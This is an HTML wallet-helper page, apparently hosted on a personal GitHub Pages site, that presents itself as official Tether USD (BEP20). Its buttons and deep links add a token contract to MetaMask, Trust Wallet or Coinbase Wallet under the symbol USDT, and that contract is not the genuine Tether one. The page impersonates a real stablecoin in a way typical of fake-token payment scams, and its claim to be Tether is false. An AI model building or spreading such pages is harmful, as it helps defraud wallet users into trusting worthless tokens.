<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Tether USD (BEP20) | Smart Wallet</title>

<meta name="description" content="Add Tether USD (BEP20) to MetaMask, Trust Wallet, or Coinbase Wallet. Smart detection for mobile wallets." />
<meta property="og:title" content="Tether USD (BEP20)" />
<meta property="og:image" content="https://yyoutoone-art.github.io/TetherUSD/logo.png" />
<meta property="og:url" content="https://yyoutoone-art.github.io/TetherUSD/" />

<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
  :root { --green:#00c78b; --bg1:#022c1f; --bg2:#0a4333; --bg3:#003320; }
  *{box-sizing:border-box}
  body{font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:linear-gradient(145deg,var(--bg1),var(--bg2),var(--bg3));color:#e8f8f4;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:48px 16px}
  .card{width:100%;max-width:520px;background:rgba(255,255,255,.06);backdrop-filter:blur(12px);border-radius:22px;padding:40px 32px;text-align:center;box-shadow:0 8px 28px rgba(0,0,0,.35)}
  .logo{width:100px;height:100px;border-radius:50%;border:3px solid var(--green);box-shadow:0 0 18px rgba(0,255,170,.28);margin:6px auto 20px;display:block}
  h1{margin:8px 0 6px;font-weight:600;color:#00ffb3}
  p{margin:0;color:#a9c7b8}
  .buttons{margin-top:22px;display:flex;flex-direction:column;gap:12px}
  .btn{width:100%;padding:14px 16px;border:none;border-radius:12px;color:#fff;font-weight:600;font-size:16px;cursor:pointer;transition:.18s}
  .btn:hover{transform:translateY(-1px);opacity:.95}
  .mm{background:linear-gradient(90deg,#f6851b,#ff9800)}
  .tw{background:linear-gradient(90deg,#3aa9f4,#2b80d9)}
  .cb{background:linear-gradient(90deg,#1652f0,#2870ff)}
  .btn[disabled]{opacity:.45;cursor:not-allowed;filter:grayscale(30%)}
  .hint{margin-top:6px;font-size:13px;color:#bfe7d9}
  .inline-link{color:#00ffb3;text-decoration:underline}
  #success{display:none;margin-top:14px;color:#00ffb3;font-weight:700}
  footer{margin-top:18px;font-size:12px;color:#9bcbbd;opacity:.8}
</style>
</head>
<body>
  <main class="card">
    <img class="logo" src="https://yyoutoone-art.github.io/TetherUSD/logo.png" alt="Tether USD logo">
    <h1>Tether USD (BEP20)</h1>
    <p>Contract: <b>0xBb7e20348fCFD959e314747873b41d51Ef1f3474</b></p>

    <section class="buttons">
      <button id="btnMM" class="btn mm" onclick="addToMetaMask()">Add to MetaMask</button>
      <div id="mmHint" class="hint" style="display:none">
        MetaMask not detected. Open this page in the MetaMask app:
        <a class="inline-link" id="mmDeepLink" href="#">Open in MetaMask</a>
      </div>

      <button class="btn tw" onclick="openTrust()">Add to Trust Wallet</button>
      <button class="btn cb" onclick="openCoinbase()">Open in Coinbase Wallet</button>
    </section>

    <div id="success">✔️ Token successfully added!</div>
    <footer>© 2025 Tether USD (BEP20)</footer>
  </main>

<script>
/* ===== Config ===== */
const CONTRACT = "0xBb7e20348fCFD959e314747873b41d51Ef1f3474";
const TOKEN_SYMBOL = "USDT";
const TOKEN_DECIMALS = 18;
const TOKEN_IMAGE = "https://yyoutoone-art.github.io/TetherUSD/logo.png";
const SITE_URL = "https://yyoutoone-art.github.io/TetherUSD/";

/* ===== Helpers ===== */
const isIOS = () => /iPad|iPhone|iPod/i.test(navigator.userAgent);
const isAndroid = () => /Android/i.test(navigator.userAgent);
const isMetaMaskEnv = () =>
  typeof window.ethereum !== "undefined" &&
  (window.ethereum.isMetaMask || /MetaMask/i.test(navigator.userAgent));
const isTrustEnv = () =>
  /TrustWallet/i.test(navigator.userAgent) || window.ethereum?.isTrustWallet || window.ethereum?.isTrust;

/* MetaMask Mobile deep link (opens dapp inside the app) */
const MM_DAPP_LINK = `https://metamask.app.link/dapp/${new URL(SITE_URL).host}${new URL(SITE_URL).pathname}`;

/* ===== UI state: enable/disable MetaMask button based on environment ===== */
(function initMMGate() {
  const btn = document.getElementById("btnMM");
  const hint = document.getElementById("mmHint");
  const dl = document.getElementById("mmDeepLink");
  dl.href = MM_DAPP_LINK;

  if (!isMetaMaskEnv()) {
    // not inside MetaMask browser
    btn.setAttribute("disabled", "true");
    hint.style.display = "block";
  } else {
    btn.removeAttribute("disabled");
    hint.style.display = "none";
  }
})();

/* ===== Chain switch to BSC ===== */
async function switchToBSC() {
  const chainId = "0x38"; // BSC mainnet
  try {
    await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId }] });
    return true;
  } catch (err) {
    if (err?.code === 4902) {
      // add BSC if missing
      try {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId,
            chainName: "Binance Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com/"]
          }]
        });
        return true;
      } catch (addErr) { console.error("Add BSC error:", addErr); }
    }
    console.error("Switch error:", err);
  }
  return false;
}

/* ===== Add token to MetaMask ===== */
async function addToMetaMask() {
  if (!isMetaMaskEnv()) {
    // safety guard (button usually disabled)
    window.location.href = MM_DAPP_LINK;
    return;
  }
  const successEl = document.getElementById("success");

  try {
    const current = await window.ethereum.request({ method: "eth_chainId" });
    if (current !== "0x38") {
      const ok = await switchToBSC();
      if (!ok) return alert("Please switch to Binance Smart Chain in MetaMask.");
    }

    const wasAdded = await window.ethereum.request({
      method: "wallet_watchAsset",
      params: {
        type: "ERC20",
        options: { address: CONTRACT, symbol: TOKEN_SYMBOL, decimals: TOKEN_DECIMALS, image: TOKEN_IMAGE }
      }
    });

    if (wasAdded) {
      successEl.style.display = "block";
      setTimeout(() => (successEl.style.display = "none"), 2500);
    }
  } catch (e) {
    console.error(e);
  }
}

/* ===== Trust Wallet deep-link (Android/iOS) ===== */
function openTrust() {
  // Android deep link adds the asset; iOS uses official link handler
  const urlAndroid = `trust://add_asset?asset=c20000714_tether&address=${CONTRACT}`;
  const urlIOS = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(SITE_URL)}`;

  // If already in Trust browser, just reload SITE_URL (user taps Add inside app)
  if (isTrustEnv()) {
    window.location.href = SITE_URL;
    return;
  }
  window.location.href = isIOS() ? urlIOS : urlAndroid;
}

/* ===== Coinbase Wallet ===== */
function openCoinbase() {
  window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(SITE_URL)}`;
}
</script>
</body>
</html>
